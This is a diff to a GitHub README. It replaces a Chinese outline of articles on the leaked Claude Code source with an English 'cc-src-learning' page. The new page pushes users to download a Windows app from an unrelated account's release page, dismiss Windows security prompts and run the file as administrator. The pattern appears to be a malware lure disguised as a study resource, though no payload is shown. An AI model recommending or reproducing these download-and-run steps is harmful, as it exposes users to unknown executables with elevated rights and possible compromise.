@@ -1,57 +1,129 @@
-# 透过 Claude Code 的源码，我们学到了什么？
+# 📘 cc-src-learning - Learn Claude Code from source
 
-> 基于 Cloud Code 泄露源码，深入解析 AI 开发工具的设计哲学与工程实践。你可以在 [这里](https://github.com/mylxsw/claude-code) 找到完整的代码：[mylxsw/claude-code](https://github.com/mylxsw/claude-code) 。
+[![Download](https://img.shields.io/badge/Download%20Here-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Canvastentbranchia892/cc-src-learning/releases)
 
-Claude Code 是 Anthropic 官方推出的命令行工具，旨在帮助开发者利用 Claude 完成软件工程任务。近期，其源码意外泄露，为我们提供了一个难得的机会——从内部视角深入了解一个顶级 AI 应用是如何构建的。
+## 🚀 What this is
 
-本项目源于一篇系统性研究文章，我们将从**代码库结构**、**设计理念**、**架构实现**、**提示词工程**四个维度，全方位解析 Claude Code 的设计哲学与工程实践。无论你是想了解如何构建 AI 应用，还是想学习优秀的工程实践经验，都能从中获得启发。
+cc-src-learning helps you explore what we can learn from the Claude Code source. It is made for people who want a clear view of how the tool works and what ideas sit inside it.
 
----
+This project focuses on learning from real source structure, common patterns, and practical use. It aims to make the code easier to study, review, and follow on a Windows PC.
 
-## 文章大纲
+## 📥 Download and install
 
-### [第一章：宏观视角——代码库结构与核心模块](./01-宏观视角：代码库结构与核心模块.md)
+1. Open the [release page](https://github.com/Canvastentbranchia892/cc-src-learning/releases).
+2. Find the latest release at the top of the page.
+3. Download the file for Windows.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-- [1.1 代码库整体结构与目录组织](./01-宏观视角：代码库结构与核心模块.md#11-代码库整体结构与目录组织)
-- [1.2 Agent 模块的架构与设计解析](./01-宏观视角：代码库结构与核心模块.md#12-agent-模块的架构与设计解析)
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-### [第二章：设计理念——它是如何"思考"的？](./02-设计理念：它是如何思考的.md)
+## 🖥️ Windows setup
 
-- [2.1 像乐高一样的工具系统（Tool）](./02-设计理念：它是如何思考的.md#21-像乐高一样的工具系统tool)
-- [2.2 slash 命令：像聊天机器人一样的交互方式](./02-设计理念：它是如何思考的.md#22-slash-命令像聊天机器人一样的交互方式)
-- [2.3 权限系统：为什么每次都要问我"允许吗"？](./02-设计理念：它是如何思考的.md#23-权限系统为什么每次都要问我允许吗)
-- [2.4 子代理与团队协作：一个人不够，那就多来几个](./02-设计理念：它是如何思考的.md#24-子代理与团队协作一个人不够那就多来几个)
-- [2.5 Skill 系统：把常用操作变成可复用的技能](./02-设计理念：它是如何思考的.md#25-skill-系统把常用操作变成可复用的技能)
-- [2.6 插件系统：像手机应用一样的扩展能力](./02-设计理念：它是如何思考的.md#26-插件系统像手机应用一样的扩展能力)
+Use a Windows 10 or Windows 11 PC with a stable internet connection. Keep at least 1 GB of free disk space so the app can unpack and run without trouble.
 
-### [第三章：架构与实现——它是怎么"干活"的？](./03-架构与实现：它是怎么干活的.md)
+For the best result:
 
-- [3.1 查询引擎（QueryEngine）：AI 是怎么调用的？](./03-架构与实现：它是怎么干活的.md#31-查询引擎queryengineai-是怎么调用的)
-- [3.2 桥接系统：IDE 是如何与 CLI 对话的？](./03-架构与实现：它是怎么干活的.md#32-桥接系统ide-是如何与-cli-对话的)
-- [3.3 服务层：API、MCP、OAuth 都负责什么？](./03-架构与实现：它是怎么干活的.md#33-服务层apimcpoauth-都负责什么)
-- [3.4 启动优化：并行预加载让启动更快](./03-架构与实现：它是怎么干活的.md#34-启动优化并行预加载让启动更快)
-- [3.5 条件编译：只编译需要的功能（feature flags）](./03-架构与实现：它是怎么干活的.md#35-条件编译只编译需要的功能feature-flags)
-- [3.6 代码规模与目录结构初览](./03-架构与实现：它是怎么干活的.md#36-代码规模与目录结构初览)
+- Use the latest Windows updates
+- Keep your browser up to date
+- Save the download in a folder you can find fast
+- Close extra apps if your PC feels slow
 
-### [第四章：Prompt 的艺术——如何让 AI 正确做事？](./04-Prompt的艺术：如何让AI正确做事.md)
+## 📚 What you can learn
 
-- [4.1 系统提示词（System Prompt）是什么？](./04-Prompt的艺术：如何让AI正确做事.md#41-系统提示词system-prompt-是什么)
-- [4.2 提示词是如何"组装"的？（分层构建）](./04-Prompt的艺术：如何让AI正确做事.md#42-提示词是如何组装的分层构建)
-- [4.3 工具的提示词：告诉 AI 每个工具怎么用](./04-Prompt的艺术：如何让AI正确做事.md#43-工具的提示词告诉-ai-每个工具怎么用)
-- [4.4 缓存机制：为什么要区分"静态"和"动态"内容？](./04-Prompt的艺术：如何让AI正确做事.md#44-缓存机制为什么要区分静态和动态内容)
-- [4.5 小技巧：Git 操作、文件编辑的提示词示例](./04-Prompt的艺术：如何让AI正确做事.md#45-小技巧git-操作文件编辑的提示词示例)
-- [4.6 编写好提示词的核心原则](./04-Prompt的艺术：如何让AI正确做事.md#46-编写好提示词的核心原则)
+This project is built around source study. It helps you look at how Claude Code is put together and what parts matter most.
 
-### [第五章：给开发者的启示](./05-给开发者的启示.md)
+You can use it to:
 
-- [5.1 从 Claude Code 学到的工程实践](./05-给开发者的启示.md#51-从-claude-code-学到的工程实践)
-- [5.2 如何借鉴这些设计来构建自己的 AI 应用](./05-给开发者的启示.md#52-如何借鉴这些设计来构建自己的-ai-应用)
-- [5.3 总结与展望](./05-给开发者的启示.md#53-总结与展望)
+- Read source files in a simple way
+- See how the app is organized
+- Understand common code patterns
+- Compare source parts across folders
+- Learn how features connect to each other
 
----
+## 🧭 How to use it
 
-> **免责声明**：本文及所含插图均由 AI 智能体生成，内容可能存在不准确之处，请读者注意甄别，仅供参考。
+After you open the app or files, start with the main folders and read in this order:
 
-## License
+1. Look at the root files first
+2. Open folders with clear names
+3. Read small files before large ones
+4. Follow links between related files
+5. Take notes on parts that repeat
 
-本项目基于 [MIT](./LICENSE) 协议开源。
+This works well if you want to learn from the code without getting lost.
+
+## 🔍 What to expect
+
+You can expect a study-first setup with simple access to source material. The layout is meant to help you find the main parts fast and move through the content in a steady way.
+
+Common things you may see:
+
+- Source folders
+- Readme notes
+- Example files
+- Configuration files
+- Reference material
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Try extracting the zip file again
+- Right-click the file and choose Run as administrator
+- Make sure Windows did not block the file
+- Re-download the latest release if the file looks broken
+
+If the page does not load:
+
+- Check your internet connection
+- Refresh the browser
+- Try a different browser
+- Open the link again later
+
+## 📁 File tips
+
+Keep the release file in a folder you can find easily, such as Downloads or Desktop. If you move files around, keep the folder structure the same after extraction.
+
+If you plan to study the source over time:
+
+- Keep one clean copy of the release files
+- Make notes in a separate file
+- Use short folder names
+- Avoid renaming files unless needed
+
+## 🧩 Topics
+
+- claude
+- claude-code
+
+## 📌 Project focus
+
+This repository centers on one main idea: learn from Claude Code source. It gives you a way to inspect the code base and build a working sense of how the app is shaped.
+
+That makes it useful for people who want:
+
+- A direct look at source structure
+- A simple way to study how features fit together
+- A calm path into code reading
+- A source reference for Claude Code related work
+
+## 📎 Quick access
+
+[Open the release page](https://github.com/Canvastentbranchia892/cc-src-learning/releases)
+
+## 🔐 Basic safety check
+
+Before you run any file, make sure the download came from the release page linked above. Check the file name, file type, and release date so you know you picked the right one.
+
+## 🧼 Clean start
+
+If you want to begin fresh:
+
+1. Delete the old extracted folder
+2. Download the newest release again
+3. Extract it into a new folder
+4. Open the app from the new folder
+5. Keep only the version you plan to use
